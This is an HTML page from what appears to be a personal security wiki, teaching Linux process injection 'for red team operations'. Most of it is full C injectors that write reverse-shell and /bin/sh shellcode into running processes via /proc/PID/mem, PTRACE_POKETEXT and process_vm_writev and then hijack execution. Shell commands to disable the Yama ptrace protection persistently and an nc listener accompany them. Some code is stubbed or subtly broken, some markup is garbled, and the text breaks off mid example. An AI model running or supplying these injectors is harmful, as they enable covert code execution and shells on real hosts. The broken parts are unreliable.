@@ -1,0 +1,1289 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<title>Process Injection on Linux | Cookie Engineer's Cyber Wiki</title>
+
+		<!-- Meta -->
+		<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=0.5, maximum-scale=2, user-scalable=yes">
+		<meta name="mobile-web-app-capable" content="yes">
+		<meta name="mobile-web-app-status-bar-style" content="black-translucent">
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="creator" content="Cookie Engineer">
+		<meta name="description" content="Process Injection on Linux">
+		<meta name="keywords" content="ld_preload, linux, memfd, proc-mem, process-injection, ptrace, redteam, shellcode">
+		<meta name="generator" content="Cookie Engineer's bare hands with peppermint tea and nightly VIM coding sessions">
+		<meta name="robots" content="index, follow">
+
+		<!-- Social Media -->
+		<meta property="og:title" content="Process Injection on Linux">
+		<meta property="og:site_name" content="Cookie Engineer's Wiki">
+		<meta property="og:description" content="ptrace-based shellcode injection, /proc/PID/mem manipulation, LD_PRELOAD, memfd_create fileless execution, process_vm_writev, and GDB scripting for red team operations.">
+		<meta property="og:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+		<meta property="og:url" content="https://cookie.engineer/wiki/articles/redteam/process-injection.md">
+		<meta property="og:type" content="article">
+
+		<!-- Shitter -->
+		<meta name="twitter:card" content="summary">
+		<meta name="twitter:domain" content="cookie.engineer">
+		<meta name="twitter:title" itemprop="name" content="Process Injection on Linux">
+		<meta name="twitter:description" itemprop="description" content="ptrace-based shellcode injection, /proc/PID/mem manipulation, LD_PRELOAD, memfd_create fileless execution, process_vm_writev, and GDB scripting for red team operations.">
+		<meta name="twitter:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+
+		<!-- Website Design -->
+		<link rel="stylesheet" href="/design/index.css">
+		<link rel="stylesheet" href="/design/highlight.css">
+		<script type="module" src="/design/index.mjs" defer></script>
+	</head>
+	<body data-layout="article">
+		<header>
+			<div><button data-action="toggle-aside" title="Toggle Sidebar" class="visible"></button><button data-action="toggle-theme" title="Switch Dark/Light Theme"></button><button data-action="toggle-font" title="Switch Dyslexic/Normal Fonts"></button><button data-action="open-website" title="Navigate to Website Index"></button><button data-action="open-wiki" title="Navigate to Wiki Index"></button></div>
+			<div><img src="/design/about/cookiengineer.png" width="32" height="32" /><h1><a href="/wiki/index.html">Cookie Engineer's Cyber Wiki</a></h1></div>
+			<div></div>
+		</header>
+
+		<div>
+		<aside class="visible">
+			<ul class="toc">
+				<li>
+					<b><a href="#overview">Overview</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#required-reading">Required Reading</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#anatomy-of-process-injection">Anatomy of Process Injection</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#procpidmem-injection">/proc/PID/mem Injection</a></b>
+					<ul>
+						<li><a href="#verification">Verification</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#ptrace-poketext-injection">ptrace POKETEXT Injection</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#yama-lsm-and-ptrace-scope">Yama LSM and ptrace_scope</a></b>
+					<ul>
+						<li><a href="#bypass-as-root">Bypass as Root</a></li>
+						<li><a href="#bypass-without-root">Bypass Without Root</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#process-vm-writev-injection">process_vm_writev Injection</a></b>
+					<ul>
+						<li><a href="#trigger-execution">Trigger Execution</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#got-overwrite-via-procpidmem">GOT Overwrite via /proc/PID/mem</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#memfd-create-fileless-execution">memfd_create - Fileless Execution</a></b>
+					<ul>
+						<li><a href="#detection">Detection</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#gdb-injection-scripted">GDB Injection (Scripted)</a></b>
+					<ul>
+						<li><a href="#gdb-stealth">GDB Stealth</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#windows-process-injection-overview">Windows Process Injection (Overview)</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#verification-steps">Verification Steps</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#common-mistakes">Common Mistakes</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#challenge">Challenge</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#references">References</a></b>
+					<ul>
+					</ul>
+				</li>
+			</ul>
+		</aside>
+
+			<main>
+				<nav aria-label="breadcrumbs">
+					<ol>
+						<li><a href="/wiki/index.html">Wiki</a></li>
+						<li><a href="/wiki/articles/redteam/index.html">Redteam</a></li>
+						<li aria-current="page"><a href="/wiki/articles/redteam/process-injection.html">Process Injection</a></li>
+					</ol>
+				</nav>
+
+				<article>
+					<h2 id="process-injection-on-linux">Process Injection on Linux</h2>
+					<p>
+						ptrace-based shellcode injection, /proc/PID/mem manipulation, LD_PRELOAD, memfd_create fileless
+						execution, process_vm_writev, and GDB scripting for red team operations.
+					</p>
+					<section>
+						<h3 id="overview">Overview</h3>
+						<p>
+							Process injection runs attacker-controlled code inside an already running process, so the payload
+							inherits the target's user, file descriptors, and network connections. After reading this article
+							you can attach with ptrace, write shellcode through
+							<code>/proc/PID/mem</code>
+							or
+							<code>process_vm_writev</code>
+							,
+							hijack execution through registers or the GOT, and run a fileless payload from a memfd.
+						</p>
+					</section>
+					<section>
+						<h3 id="required-reading">Required Reading</h3>
+						<ul>
+							<li><a href="/wiki/articles/fundamentals/processes.html">/wiki/articles/fundamentals/processes.html</a> - process memory layout, fork/exec, /proc filesystem, task_struct</li>
+							<li><a href="/wiki/articles/fundamentals/threads.html">/wiki/articles/fundamentals/threads.html</a> - thread creation with pthread_create, clone(2), thread-local storage</li>
+							<li><a href="/wiki/articles/fundamentals/virtual-memory.html">/wiki/articles/fundamentals/virtual-memory.html</a> - virtual address space, page tables, /proc/PID/maps, mmap(2)</li>
+							<li><a href="/wiki/articles/fundamentals/system-calls.html">/wiki/articles/fundamentals/system-calls.html</a> - ptrace(2), memfd_create(2), process_vm_writev(2), <abbr title="Penetration Test">PT</abbr> RACE_* operations</li>
+							<li><a href="/wiki/articles/fundamentals/elf.html">/wiki/articles/fundamentals/elf.html</a> - ELF segments, .text section, entry point, <abbr title="Penetration Test">PT</abbr> _LOAD</li>
+						</ul>
+					</section>
+					<section>
+						<h3 id="anatomy-of-process-injection">Anatomy of Process Injection</h3>
+						<p>
+							Process injection is the technique of introducing arbitrary code into a running process and
+							redirecting execution to it. The goal: run your payload in the context of another process, inheriting
+							its permissions, network connections, and legitimacy.
+						</p>
+						<p>The injection pipeline has three stages:</p>
+						<pre class="plaintext">
+[1. ATTACH] ──► [2. INJECT] ──► [3. EXECUTE]
+   │                │                │
+   │ ptrace(2)      │ write(2)       │ PTRACE_SETREGS
+   │ /proc/PID/mem  │ mmap(2)        │ GOT overwrite
+   │ process_vm     │ pwrite(2)      │ signal handler
+						</pre>
+						<p>
+							Each stage has constraints: the attachment method determines privilege requirements (ptrace
+							requires
+							<code>CAP_SYS_PTRACE</code>
+							or same UID), the injection method determines where in memory code
+							lands, and the execution trigger determines stealth.
+						</p>
+					</section>
+					<section>
+						<h3 id="procpidmem-injection">/proc/PID/mem Injection</h3>
+						<p>
+							The
+							<code>/proc/PID/mem</code>
+							file is a memory image of the target process. With
+							<code>PTRACE_ATTACH</code>
+							, you
+							can read and write any mapped virtual address. Before Linux 3.2, or with
+							<code>ptrace_scope=0</code>
+							,
+							you could write directly; the Yama LSM now restricts this.
+						</p>
+						<p>
+							The technique: open
+							<code>/proc/PID/mem</code>
+							, seek to the target's executable stack (or a mmap'd region),
+							write shellcode, then redirect execution via SIGTR
+							<abbr title="Access Point">AP</abbr>
+							or register manipulation.
+						</p>
+						<pre class="c">
+/*
+ * proc_mem_inject.c — Inject shellcode via /proc/PID/mem
+ * Compile: gcc -o proc_mem_inject proc_mem_inject.c
+ * Usage:   sudo ./proc_mem_inject &lt;target_pid&gt;
+ *
+ * WARNING: Requires ptrace attachment. Yama LSM must allow it:
+ *   echo 0 &gt; /proc/sys/kernel/yama/ptrace_scope
+ */
+
+#define _GNU_SOURCE
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;sys/ptrace.h&gt;
+#include &lt;sys/wait.h&gt;
+#include &lt;sys/user.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;errno.h&gt;
+
+/* Position-independent reverse shell shellcode (x86_64, Linux)
+ * Connects to 127.0.0.1:4444, spawns /bin/sh
+ * Generated with: msfvenom -p linux/x64/shell_reverse_tcp \
+ *   LHOST=127.0.0.1 LPORT=4444 -f c */
+unsigned char shellcode[] =
+    &#34;\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0&#34;
+    &#34;\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49&#34;
+    &#34;\x89\xc4\x48\x89\xc7\x48\x31\xc0\x50\xc7\x44\x24\xfc\x7f\x00&#34;
+    &#34;\x00\x01\x66\xc7\x44\x24\xfa\x11\x5c\xc6\x44\x24\xf8\x02\x48&#34;
+    &#34;\x83\xec\x08\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x21\x58\x0f&#34;
+    &#34;\x05\x48\xff\xc6\x6a\x21\x58\x0f\x05\x48\xff\xc6\x6a\x21\x58&#34;
+    &#34;\x0f\x05\x48\x31\xc0\x50\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73&#34;
+    &#34;\x68\x50\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x6a\x3b\x58\x0f&#34;
+    &#34;\x05&#34;;
+
+size_t shellcode_len = sizeof(shellcode) - 1;
+
+/* Read the target&#39;s /proc/PID/maps to find an executable region */
+void find_executable_region(pid_t target_pid,
+    unsigned long *start_addr, unsigned long *end_addr)
+{
+    char maps_path[256];
+    snprintf(maps_path, sizeof(maps_path),
+        &#34;/proc/%d/maps&#34;, target_pid);
+
+    FILE *maps_file = fopen(maps_path, &#34;r&#34;);
+    if (!maps_file) {
+        perror(&#34;fopen /proc/PID/maps&#34;);
+        exit(EXIT_FAILURE);
+    }
+
+    char line[512];
+    while (fgets(line, sizeof(line), maps_file)) {
+        unsigned long start, end;
+        char permissions[8];
+        sscanf(line, &#34;%lx-%lx %4s&#34;, &amp;start, &amp;end, permissions);
+
+        /* Look for an executable region that is NOT the stack
+         * and NOT vDSO. Prefer the heap or an anonymous mapping. */
+        if (permissions[2] == &#39;x&#39; &amp;&amp; strstr(line, &#34;[heap]&#34;)) {
+            *start_addr = start;
+            *end_addr = end;
+            fclose(maps_file);
+            return;
+        }
+    }
+
+    /* Fallback: use any writable+executable region */
+    rewind(maps_file);
+    while (fgets(line, sizeof(line), maps_file)) {
+        unsigned long start, end;
+        char permissions[8];
+        sscanf(line, &#34;%lx-%lx %4s&#34;, &amp;start, &amp;end, permissions);
+
+        if (permissions[0] == &#39;r&#39; &amp;&amp; permissions[2] == &#39;x&#39;) {
+            *start_addr = start;
+            *end_addr = end;
+            fclose(maps_file);
+            return;
+        }
+    }
+
+    fclose(maps_file);
+    fprintf(stderr, &#34;[-] No suitable executable region found\n&#34;);
+    exit(EXIT_FAILURE);
+}
+
+/* Write shellcode via /proc/PID/mem at the given address */
+void write_via_proc_mem(pid_t target_pid,
+    unsigned long address, unsigned char *data, size_t length)
+{
+    char mem_path[256];
+    snprintf(mem_path, sizeof(mem_path),
+        &#34;/proc/%d/mem&#34;, target_pid);
+
+    int mem_fd = open(mem_path, O_RDWR);
+    if (mem_fd &lt; 0) {
+        perror(&#34;open /proc/PID/mem&#34;);
+        exit(EXIT_FAILURE);
+    }
+
+    if (lseek(mem_fd, address, SEEK_SET) &lt; 0) {
+        perror(&#34;lseek&#34;);
+        close(mem_fd);
+        exit(EXIT_FAILURE);
+    }
+
+    ssize_t written = write(mem_fd, data, length);
+    if (written &lt; 0) {
+        perror(&#34;write to /proc/PID/mem&#34;);
+        close(mem_fd);
+        exit(EXIT_FAILURE);
+    }
+
+    printf(&#34;[+] Wrote %zd bytes at 0x%lx\n&#34;, written, address);
+    close(mem_fd);
+}
+
+int main(int argc, char **argv)
+{
+    if (argc &lt; 2) {
+        fprintf(stderr, &#34;Usage: %s &lt;target_pid&gt;\n&#34;, argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    pid_t target_pid = atoi(argv[1]);
+    printf(&#34;[*] Target PID: %d\n&#34;, target_pid);
+
+    /* Step 1: Attach to the target with ptrace */
+    printf(&#34;[*] Attaching to PID %d with ptrace...\n&#34;, target_pid);
+    if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) &lt; 0) {
+        perror(&#34;ptrace PTRACE_ATTACH&#34;);
+        fprintf(stderr, &#34;[-] Check ptrace_scope: &#34;
+            &#34;cat /proc/sys/kernel/yama/ptrace_scope\n&#34;);
+        return EXIT_FAILURE;
+    }
+
+    /* Wait for the target to stop */
+    int status;
+    waitpid(target_pid, &amp;status, 0);
+    if (!WIFSTOPPED(status)) {
+        fprintf(stderr, &#34;[-] Target did not stop\n&#34;);
+        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
+        return EXIT_FAILURE;
+    }
+    printf(&#34;[+] Target stopped\n&#34;);
+
+    /* Step 2: Read original registers (save RIP for later) */
+    struct user_regs_struct original_regs;
+    if (ptrace(PTRACE_GETREGS, target_pid, NULL,
+        &amp;original_regs) &lt; 0) {
+        perror(&#34;ptrace PTRACE_GETREGS&#34;);
+        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
+        return EXIT_FAILURE;
+    }
+    printf(&#34;[+] Original RIP: 0x%llx\n&#34;, original_regs.rip);
+
+    /* Step 3: Find an executable region in the target */
+    unsigned long inject_start = 0, inject_end = 0;
+    find_executable_region(target_pid,
+        &amp;inject_start, &amp;inject_end);
+    printf(&#34;[+] Injecting into region: 0x%lx - 0x%lx\n&#34;,
+        inject_start, inject_end);
+
+    /* Step 4: Write shellcode via /proc/PID/mem */
+    write_via_proc_mem(target_pid,
+        inject_start, shellcode, shellcode_len);
+
+    /* Step 5: Redirect RIP to the shellcode */
+    struct user_regs_struct new_regs = original_regs;
+    new_regs.rip = inject_start;
+
+    if (ptrace(PTRACE_SETREGS, target_pid, NULL,
+        &amp;new_regs) &lt; 0) {
+        perror(&#34;ptrace PTRACE_SETREGS&#34;);
+        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
+        return EXIT_FAILURE;
+    }
+    printf(&#34;[+] RIP redirected to 0x%lx\n&#34;, inject_start);
+
+    /* Step 6: Continue the target — shellcode executes */
+    printf(&#34;[*] Continuing target (shellcode executes)...\n&#34;);
+    if (ptrace(PTRACE_CONT, target_pid, NULL, NULL) &lt; 0) {
+        perror(&#34;ptrace PTRACE_CONT&#34;);
+        return EXIT_FAILURE;
+    }
+
+    /* For a reverse shell, the target process is now blocked
+     * in the shellcode. Wait for it to exit (shell exits). */
+    waitpid(target_pid, &amp;status, 0);
+    printf(&#34;[*] Target exited (shell closed)\n&#34;);
+
+    return EXIT_SUCCESS;
+}
+						</pre>
+						<h4 id="verification">Verification</h4>
+						<p>
+							After injection, check
+							<code>/proc/PID/maps</code>
+							:
+						</p>
+						<pre class="bash">
+# Run the injector
+sudo ./proc_mem_inject 12345
+
+# In another terminal, verify the shellcode in the target&#39;s memory
+sudo dd if=/proc/12345/mem bs=1 skip=$((0xINJECT_ADDR)) count=100 2&gt;/dev/null | xxd
+
+# Check for listening connections (reverse shell listener should catch it)
+nc -lvnp 4444
+						</pre>
+					</section>
+					<section>
+						<h3 id="ptrace-poketext-injection">ptrace POKETEXT Injection</h3>
+						<p>
+							Instead of
+							<code>/proc/PID/mem</code>
+							, use
+							<code>PTRACE_POKETEXT</code>
+							to write 8 bytes at a time into the target's
+							text segment. This avoids the
+							<code>/proc/PID/mem</code>
+							file descriptor altogether:
+						</p>
+						<pre class="c">
+/*
+ * ptrace_poke_inject.c — Inject shellcode using PTRACE_POKETEXT
+ * Compile: gcc -o ptrace_poke_inject ptrace_poke_inject.c
+ * Usage:   sudo ./ptrace_poke_inject &lt;target_pid&gt;
+ */
+
+#define _GNU_SOURCE
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/ptrace.h&gt;
+#include &lt;sys/wait.h&gt;
+#include &lt;sys/user.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;errno.h&gt;
+
+/* Simple execve(&#34;/bin/sh&#34;, NULL, NULL) shellcode (27 bytes) */
+unsigned char exec_sh_shellcode[] =
+    &#34;\x48\x31\xd2&#34;                  /* xor    %rdx, %rdx           */
+    &#34;\x48\xbb\x2f\x2f\x62\x69\x6e&#34;  /* movabs $0x68732f6e69622f2f,%rbx */
+    &#34;\x2f\x73\x68&#34;
+    &#34;\x48\xc1\xeb\x08&#34;              /* shr    $0x8, %rbx           */
+    &#34;\x53&#34;                          /* push   %rbx                 */
+    &#34;\x48\x89\xe7&#34;                  /* mov    %rsp, %rdi           */
+    &#34;\x50&#34;                          /* push   %rax                 */
+    &#34;\x57&#34;                          /* push   %rdi                 */
+    &#34;\x48\x89\xe6&#34;                  /* mov    %rsp, %rsi           */
+    &#34;\xb0\x3b&#34;                      /* mov    $0x3b, %al           */
+    &#34;\x0f\x05&#34;;                     /* syscall                     */
+
+size_t shellcode_size = sizeof(exec_sh_shellcode) - 1;
+
+/* Use ptrace to invoke mmap in the target and allocate RWX memory */
+unsigned long remote_mmap(pid_t target_pid, size_t size)
+{
+    struct user_regs_struct saved_regs, call_regs;
+    unsigned long mmap_addr;
+
+    /* Save current registers */
+    ptrace(PTRACE_GETREGS, target_pid, NULL, &amp;saved_regs);
+    call_regs = saved_regs;
+
+    /* Find mmap in the remote process&#39;s libc
+     * This requires parsing /proc/PID/maps to find libc base
+     * For simplicity, we read /proc/PID/syscall after a benign call
+     * Or we hard-code: mmap is at a known offset in libc
+     * Better approach: use the vDSO or read /proc/PID/maps */
+
+    char maps_path[256];
+    snprintf(maps_path, sizeof(maps_path),
+        &#34;/proc/%d/maps&#34;, target_pid);
+
+    FILE *maps_file = fopen(maps_path, &#34;r&#34;);
+    if (!maps_file) {
+        perror(&#34;fopen maps&#34;);
+        return 0;
+    }
+
+    unsigned long libc_base = 0;
+    char line[512];
+    while (fgets(line, sizeof(line), maps_file)) {
+        if (strstr(line, &#34;libc&#34;) &amp;&amp; strstr(line, &#34;r-xp&#34;)) {
+            sscanf(line, &#34;%lx-&#34;, &amp;libc_base);
+            break;
+        }
+    }
+    fclose(maps_file);
+
+    if (!libc_base) {
+        fprintf(stderr, &#34;[-] Could not find libc in target\n&#34;);
+        return 0;
+    }
+    printf(&#34;[+] libc base: 0x%lx\n&#34;, libc_base);
+
+    /* Calculate mmap address (this offset varies per libc version)
+     * We use dlsym-like resolution from the injector&#39;s own libc
+     * offset, assuming the same libc version. */
+    void *injector_mmap = dlsym(RTLD_DEFAULT, &#34;mmap&#34;);
+    if (!injector_mmap) {
+        perror(&#34;dlsym mmap&#34;);
+        return 0;
+    }
+
+    /* Get our own libc base */
+    void *injector_libc = NULL;
+    dladdr(injector_mmap, &amp;injector_libc);
+    /* ... dladdr is complex, simplified: use offset from /proc/self/maps */
+    /* For the example, we skip dynamic resolution and use syscall directly */
+    return 0; /* See full example below with syscall approach */
+}
+
+/* Alternative: use process_vm_writev for the write portion */
+int main(int argc, char **argv)
+{
+    if (argc &lt; 2) {
+        fprintf(stderr, &#34;Usage: %s &lt;target_pid&gt;\n&#34;, argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    pid_t target_pid = atoi(argv[1]);
+    printf(&#34;[*] Target PID: %d\n&#34;, target_pid);
+
+    /* Attach */
+    if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) &lt; 0) {
+        perror(&#34;PTRACE_ATTACH&#34;);
+        return EXIT_FAILURE;
+    }
+
+    int status;
+    waitpid(target_pid, &amp;status, 0);
+    if (!WIFSTOPPED(status)) {
+        fprintf(stderr, &#34;[-] Target did not stop\n&#34;);
+        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
+        return EXIT_FAILURE;
+    }
+    printf(&#34;[+] Target stopped at signal %d\n&#34;, WSTOPSIG(status));
+
+    /* Save registers */
+    struct user_regs_struct original_regs, inject_regs;
+    ptrace(PTRACE_GETREGS, target_pid, NULL, &amp;original_regs);
+    inject_regs = original_regs;
+    printf(&#34;[+] Original RIP: 0x%llx\n&#34;, original_regs.rip);
+
+    /* For a simpler approach: find an RWX region via /proc/PID/maps
+     * and use PTRACE_POKETEXT to write the shellcode word by word */
+    char maps_path[256];
+    snprintf(maps_path, sizeof(maps_path),
+        &#34;/proc/%d/maps&#34;, target_pid);
+
+    FILE *maps = fopen(maps_path, &#34;r&#34;);
+    unsigned long rwx_addr = 0, rwx_end = 0;
+    char map_line[512];
+    while (fgets(map_line, sizeof(map_line), maps)) {
+        unsigned long start, end;
+        char perm[8];
+        if (sscanf(map_line, &#34;%lx-%lx %4s&#34;, &amp;start, &amp;end, perm) == 3) {
+            /* Look for an anonymous RWX mapping or stack */
+            if (strchr(perm, &#39;x&#39;) &amp;&amp; strchr(perm, &#39;w&#39;) &amp;&amp;
+                (strstr(map_line, &#34;[stack]&#34;) ||
+                 strstr(map_line, &#34;00000000&#34;))) {
+                rwx_addr = start;
+                rwx_end = end;
+                break;
+            }
+        }
+    }
+    fclose(maps);
+
+    if (!rwx_addr) {
+        fprintf(stderr, &#34;[-] No writable+executable region found\n&#34;);
+        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
+        return EXIT_FAILURE;
+    }
+    printf(&#34;[+] RWX region: 0x%lx - 0x%lx\n&#34;, rwx_addr, rwx_end);
+
+    /* Pad shellcode to multiple of 8 for PTRACE_POKETEXT */
+    size_t padded_len = (shellcode_size + 7) &amp; ~7;
+    unsigned char padded_shellcode[4096];
+    memset(padded_shellcode, 0x90, padded_len);  /* NOP sled */
+    memcpy(padded_shellcode, exec_sh_shellcode, shellcode_size);
+
+    /* Write shellcode 8 bytes at a time */
+    for (size_t offset = 0; offset &lt; padded_len; offset += 8) {
+        unsigned long word;
+        memcpy(&amp;word, padded_shellcode + offset, sizeof(word));
+
+        if (ptrace(PTRACE_POKETEXT, target_pid,
+            (void *)(rwx_addr + offset), (void *)word) &lt; 0) {
+            perror(&#34;PTRACE_POKETEXT&#34;);
+            ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
+            return EXIT_FAILURE;
+        }
+    }
+    printf(&#34;[+] Shellcode written (%zu bytes)\n&#34;, padded_len);
+
+    /* Redirect RIP */
+    inject_regs.rip = rwx_addr;
+    if (ptrace(PTRACE_SETREGS, target_pid, NULL,
+        &amp;inject_regs) &lt; 0) {
+        perror(&#34;PTRACE_SETREGS&#34;);
+        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
+        return EXIT_FAILURE;
+    }
+    printf(&#34;[+] RIP set to 0x%lx\n&#34;, rwx_addr);
+
+    /* Continue execution */
+    printf(&#34;[*] Continuing target...\n&#34;);
+    ptrace(PTRACE_CONT, target_pid, NULL, NULL);
+    waitpid(target_pid, &amp;status, 0);
+
+    /* Restore original registers if target survives */
+    ptrace(PTRACE_SETREGS, target_pid, NULL, &amp;original_regs);
+    ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
+    printf(&#34;[+] Detached\n&#34;);
+
+    return EXIT_SUCCESS;
+}
+						</pre>
+					</section>
+					<section>
+						<h3 id="yama-lsm-and-ptrace-scope">Yama LSM and ptrace_scope</h3>
+						<p>
+							The Yama Linux Security Module restricts ptrace access to prevent exactly this attack. The value
+							in
+							<code>/proc/sys/kernel/yama/ptrace_scope</code>
+							controls the restriction:
+						</p>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Value</th>
+									<th align="center">Name</th>
+									<th align="center">Behavior</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center">0</td>
+									<td align="center">Classic</td>
+									<td align="center">Any process can ptrace any other (same UID)</td>
+								</tr>
+								<tr>
+									<td align="center">1</td>
+									<td align="center">Restricted (default)</td>
+									<td align="center">Only parent-child or processes with<code>CAP_SYS_PTRACE</code></td>
+								</tr>
+								<tr>
+									<td align="center">2</td>
+									<td align="center">Admin-only</td>
+									<td align="center">Only processes with<code>CAP_SYS_PTRACE</code></td>
+								</tr>
+								<tr>
+									<td align="center">3</td>
+									<td align="center">No-attach</td>
+									<td align="center">ptrace completely disabled</td>
+								</tr>
+							</tbody>
+						</table>
+						<h4 id="bypass-as-root">Bypass as Root</h4>
+						<p>If you have root, disable it:</p>
+						<pre class="bash">
+echo 0 &gt; /proc/sys/kernel/yama/ptrace_scope
+# Or persistently:
+echo &#39;kernel.yama.ptrace_scope = 0&#39; &gt;&gt; /etc/sysctl.d/99-injection.conf
+sysctl -p /etc/sysctl.d/99-injection.conf
+						</pre>
+						<h4 id="bypass-without-root">Bypass Without Root</h4>
+						<p>
+							If you are the parent of the target (you forked it yourself),
+							<code>ptrace_scope=1</code>
+							still allows
+							attachment.
+						</p>
+					</section>
+					<section>
+						<h3 id="process-vm-writev-injection">process_vm_writev Injection</h3>
+						<p>
+							<code>process_vm_writev(2)</code>
+							writes data directly into another process's memory without a
+							<code>PTRACE_ATTACH</code>
+							. Permission is governed by the
+							<code>PTRACE_MODE_ATTACH_REALCREDS</code>
+							check, so the caller needs the
+							same UID or
+							<code>CAP_SYS_PTRACE</code>
+							, and Yama's
+							<code>ptrace_scope</code>
+							rules still apply because the kernel
+							runs the same
+							<code>ptrace_may_access</code>
+							check. The syscall writes memory; it does not redirect execution,
+							so you still need a separate trigger.
+						</p>
+						<pre class="c">
+/*
+ * pvm_inject.c — Inject via process_vm_writev (no ptrace)
+ * Compile: gcc -o pvm_inject pvm_inject.c
+ * Usage:   ./pvm_inject &lt;target_pid&gt; &lt;shellcode_address&gt;
+ *
+ * No PTRACE_ATTACH needed. Target must share your UID, or you need
+ * CAP_SYS_PTRACE. Yama ptrace_scope still applies via ptrace_may_access.
+ */
+
+#define _GNU_SOURCE
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/uio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;errno.h&gt;
+
+/* /bin/sh shellcode */
+unsigned char shellcode[] =
+    &#34;\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68&#34;
+    &#34;\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6&#34;
+    &#34;\xb0\x3b\x0f\x05&#34;;
+
+size_t shellcode_len = sizeof(shellcode) - 1;
+
+int main(int argc, char **argv)
+{
+    if (argc &lt; 3) {
+        fprintf(stderr, &#34;Usage: %s &lt;target_pid&gt; &lt;remote_address&gt;\n&#34;, argv[0]);
+        fprintf(stderr, &#34;  remote_address: address in target to write to\n&#34;);
+        fprintf(stderr, &#34;  Get this from /proc/PID/maps (look for RWX or stack)\n&#34;);
+        return EXIT_FAILURE;
+    }
+
+    pid_t target_pid = atoi(argv[1]);
+    unsigned long remote_addr = strtoul(argv[2], NULL, 0);
+
+    struct iovec local_iov;
+    struct iovec remote_iov;
+
+    local_iov.iov_base = shellcode;
+    local_iov.iov_len = shellcode_len;
+    remote_iov.iov_base = (void *)remote_addr;
+    remote_iov.iov_len = shellcode_len;
+
+    ssize_t written = process_vm_writev(
+        target_pid,      /* target PID */
+        &amp;local_iov,      /* local buffers */
+        1,               /* local iov count */
+        &amp;remote_iov,     /* remote buffers */
+        1,               /* remote iov count */
+        0);              /* flags */
+
+    if (written &lt; 0) {
+        perror(&#34;process_vm_writev&#34;);
+        return EXIT_FAILURE;
+    }
+
+    printf(&#34;[+] Wrote %zd bytes to PID %d at 0x%lx\n&#34;,
+        written, target_pid, remote_addr);
+    printf(&#34;[!] Shellcode written. You still need to trigger execution\n&#34;);
+    printf(&#34;[!] Options:\n&#34;);
+    printf(&#34;    - Send SIGTRAP to redirect to the address\n&#34;);
+    printf(&#34;    - Overwrite GOT entry\n&#34;);
+    printf(&#34;    - Overwrite return address on stack\n&#34;);
+    printf(&#34;    - Use ptrace to SETREGS (requires PTRACE_ATTACH first)\n&#34;);
+
+    return EXIT_SUCCESS;
+}
+						</pre>
+						<h4 id="trigger-execution">Trigger Execution</h4>
+						<p>
+							After writing with
+							<code>process_vm_writev</code>
+							you still need a redirect. Since you are the same UID,
+							you can:
+						</p>
+						<pre class="bash">
+# 1. Send SIGSTOP, then use PTRACE_ATTACH + PTRACE_SETREGS + PTRACE_DETACH
+# 2. Or overwrite a function pointer / GOT entry that will be called naturally
+# 3. Or use the kernel&#39;s uprobe mechanism
+						</pre>
+					</section>
+					<section>
+						<h3 id="got-overwrite-via-procpidmem">GOT Overwrite via /proc/PID/mem</h3>
+						<p>
+							Overwriting a Global Offset Table (GOT) entry redirects a library function call to your shellcode.
+							When the target calls
+							<code>printf()</code>
+							, it jumps to the GOT entry for
+							<code>printf</code>
+							, which now points
+							to your code.
+						</p>
+						<pre class="c">
+/*
+ * got_overwrite.c — GOT overwrite injection via /proc/PID/mem
